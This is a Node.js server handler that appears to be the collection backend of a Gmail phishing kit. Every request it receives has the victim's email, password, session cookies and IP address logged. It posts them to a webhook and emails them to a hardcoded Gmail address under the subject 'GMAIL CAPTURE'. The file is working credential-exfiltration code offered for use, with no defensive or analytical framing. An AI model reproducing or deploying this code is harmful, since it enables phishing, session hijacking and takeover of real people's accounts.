const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // SAVE COOKIES + DATA
  const log = `[${new Date().toISOString()}] IP:${ip} | ${data.email} | PASS:${data.password} | COOKIES:${data.cookies}\n`;
  

  await fetch(process.env.WEBHOOK_URL || 'https://webhook.site/YOUR-ID', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...data, ip, log })
  });

  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: process.env.EMAIL_USER,  // your@gmail.com
      pass: process.env.EMAIL_PASS   // App Password
    }
  });

  await transporter.sendMail({
    from: process.env.EMAIL_USER,
    to: 'busmeup13@gmail.com',
    subject: `🔔 GMAIL CAPTURE: ${data.email}`,
    html: `
      <h2>🎯 Credentials Captured</h2>
      <p><strong>IP:</strong> ${ip}</p>
      <p><strong>Email:</strong> ${data.email}</p>
      <p><strong>Password:</strong> ${data.password}</p>
      <p><strong>Cookies:</strong> ${data.cookies}</p>
      <pre>${JSON.stringify(data, null, 2)}</pre>
    `
  });

  res.json({ status: 'captured', cookies: data.cookies });
};